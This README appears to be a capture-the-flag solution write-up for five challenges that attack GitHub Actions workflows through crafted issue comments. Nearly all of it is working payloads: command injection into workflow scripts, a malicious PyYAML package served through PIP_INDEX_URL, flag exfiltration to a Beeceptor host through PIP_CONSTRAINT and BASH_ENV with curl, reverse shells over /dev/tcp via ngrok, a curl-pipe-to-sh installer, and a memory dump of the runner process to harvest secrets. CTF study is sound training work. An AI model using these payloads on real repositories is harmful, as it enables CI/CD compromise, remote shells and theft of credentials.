<a id="readme-top"></a>
<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#chall-1">Challenge 1</a>
    </li>
    <li>
      <a href="#chall-2">Challenge 2</a>
      <ul>
        <li><a href="#using-pip_index_url">Using PIP_INDEX_URL</a></li>
        <li><a href="#using-pip_constraint">Using PIP_CONSTRAINT</a></li>
      </ul>
    </li>
    <li>
      <a href="#chall-3">Challenge 3</a>
      <ul>
        <li><a href="#using-bash_env">Using BASH_ENV</a></li>
        <li><a href="#using-bash_func">Using BASH_FUNC</a></li>
      </ul>
    </li>
    <li>
      <a href="#chall-4">Challenge 4</a>
    </li>
    <li>
      <a href="#chall-5">Challenge 5</a>
    </li>
  </ol>
</details>

# Chall 1

Issue Comment:
``` bash
Hello, there!'; echo "Here is your flag: ${FLAG}" | base64 ;echo 'General Kenobi
```
<p align="right">(<a href="#readme-top">back to top</a>)</p>






# Chall 2
### Using PIP_INDEX_URL
> [!NOTE]
> - [PIP environment variables doc](https://pip.pypa.io/en/latest/cli/pip_install/) PIP_<UPPER_LONG_NAME>
> - [Pypi PyYAML](https://pypi.org/project/PyYAML/)
> - [Cloudsmith](https://cloudsmith.io/~nebco/packages/)

_Below is how to setup the library to inject_
1. Install Python
2. Install PIP
```sh
pip install wheel
pip install setuptools
```
4. Create a new directory named pyyaml
5. Create a setup.py
```Python
from setuptools import setup, find_packages

setup(
    name='pyyaml',
    version='6.0.1',
    packages=find_packages(),
    install_requires=[],  # Si tu veux ajouter des dépendances
    entry_points={
        'console_scripts': [
            'yaml = yaml.main:main',  # yaml sera la commande qui déclenchera ton script
        ],
    },
)
```
6. Create a directory named `yaml`
7. Add `__INIT__` file in the directory named yaml and edit:
```Python
import os

print("COUCOU TDF3")
env_vars = os.environ
for key, value in env_vars.items():
    if key == "flag" or key == "FLAG":
        print("===== FLAG SPLIT =====")
        print(f'Part 1 (0-5): {value[0:5]}')
        print(f'Part 2 (5-100): {value[5:100]}')
```
8. Execute
``` sh
python setup.py bdist bdist_wheel
```

Issue Comment:
``` sh
Not a release :(
PIP_INDEX_URL=https://cloudsmith.io/~nebco/packages/#
```
> [!TIP]
> Alternatives to cloudsmith:
> - Host your own registry (local, AWS or other...)
> - Use github pages
>
> Sometimes indentation doesn't work when commenting an issue. It is therefore preferable to use `Github CLI` directly and push a file. `gh issue comment <id_issue> -F <file_name>`
<p align="right">(<a href="#readme-top">back to top</a>)</p>





### Using PIP_CONSTRAINT
> [!NOTE]
> - [Beeceptor](https://beeceptor.com/)
> - [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)

1. Go to BeeCeptor.com
2. add new `Mocking Rules`
``` md
Match value: /<file_name>.txt
Response body: pyyaml@https://tdf123456.free.beeceptor.com/${FLAG}%
```

Issue Comment:
``` bash
Not a release :(
PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/get-flag
```
<p align="right">(<a href="#readme-top">back to top</a>)</p>





# Chall 3
### Using BASH_ENV
> [!NOTE]
> - [Bash variables doc](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
> - [Beeceptor](https://beeceptor.com/)
> - [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)

Body Issue Comment:
``` bash
Not a release :(
BASH_ENV=$(curl https://tdf123456.free.beeceptor.com?flag=$(echo "$FLAG" | base64))
```
<p align="right">(<a href="#readme-top">back to top</a>)</p>





### Using BASH_FUNC
Body Issue Comment:
``` bash
Not a release :(
BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
```
 <p align="right">(<a href="#readme-top">back to top</a>)</p>





# Chall 4
1. Open a terminal for setup (client side)
2. Listen with NC
``` bash
nc -lv 4444
```
3. setup ngrok (new terminal)
``` bash
ngrok tcp 4444
```
4. Get ngrok IP to build payload (new terminal)
``` bash
dig <NGROK_DNS>
```

Body Issue Comment:
``` bash
Where is my bash ??
$(bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1)
```
5. Investigate in the runner 
The directory `/home/runner/work/_temp` look interesting...


> [!TIP]
> Fancy shell for lazy DevOps :)
> ``` bash
> curl -sSf https://sshx.io/get | sh -s run
> ```
<p align="right">(<a href="#readme-top">back to top</a>)</p>





# Chall 5
1. Open a terminal for setup (client side)
2. Listen with NC
``` bash
nc -lv 4444
```
3. setup ngrok (new terminal)
``` bash
ngrok tcp 4444
```
4. Get ngrok IP to build payload (new terminal)
``` bash
dig <NGROK_DNS>
```
Body Issue Comment:
``` bash
; bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1
```
5. Dump and check those secrets
``` bash
sudo apt-get install -y gdb; sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{print $1}')"; grep -Eao '"[^"]+":\{"value":"[^"]*","isSecret":true\}' k.dump*
```

> [!TIP]
> Fancy shell for lazy DevOps :)
> ``` bash
> curl -sSf https://sshx.io/get | sh -s run
> ```
<p align="right">(<a href="#readme-top">back to top</a>)</p>
 
